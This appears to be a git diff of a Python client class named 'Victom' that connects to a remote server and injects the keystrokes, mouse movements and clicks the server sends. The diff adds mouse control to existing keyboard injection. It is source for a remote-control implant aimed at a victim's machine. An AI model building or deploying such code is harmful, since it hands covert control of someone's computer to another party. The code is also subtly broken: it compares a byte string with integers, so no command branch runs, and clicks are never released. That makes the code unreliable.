@@ -2,14 +2,16 @@ import json
 import socket
 from pathlib import Path
 from pynput import mouse, keyboard
-from pynput.keyboard import Key, Controller
+from pynput.keyboard import Controller as Controller_Keybooard
+from pynput.mouse import Controller as Controller_mouse
 import time
 
 
 class Victom:
     def __init__(self):
 
-        self.keyboard = Controller()
+        self.Control_kb = Controller_Keybooard()
+        self.Control_m = Controller_mouse()
         self.Client: socket.socket = None
 
         config_path = Path(__file__).with_name('config.json')
@@ -24,21 +26,32 @@ class Victom:
 
             while True:
                 try:
-                    data_size = self.recv_exact(1)
-                    file_size = int.from_bytes(data_size, "big")
-                    KeyPress = self.recv_exact(file_size).decode()
+                    Mod = self.recv_exact(1) # Mod Control
+                    data_size = int.from_bytes(self.recv_exact(2), "big") # Size Of Data Control
+                    Control = self.recv_exact(data_size).decode() # Control
                 except ConnectionError:
                     break
 
-                if KeyPress.startswith("Key."):
-                    key_name = KeyPress[4:]
-                    key = getattr(keyboard.Key, key_name)
-                else:
-                    key = KeyPress
+                if (Mod == len("kb".encode())):
+                    if Control.startswith("Key."):
+                        key_name = Control[4:]
+                        key = getattr(keyboard.Key, key_name)
+                    else:
+                        key = Control
+
+                    self.Control_kb.press(key)
+                    time.sleep(0.03)
+                    self.Control_kb.release(key)
+                elif (Mod == len("pos".encode())):
+                    x, y = Control.split("|")
+                    x = int(x)
+                    y = int(y)
+                    self.Control_m.move(x, y)
+                elif (Mod == len("click".encode())):
+                    Button_name = Control[8:]
+                    Button = getattr(mouse.Button, Button_name)
+                    self.Control_m.press(Button)
                 
-                self.keyboard.press(key)
-                time.sleep(0.03)
-                self.keyboard.release(key)
 
     def recv_exact(self, size):
         data_record = b""
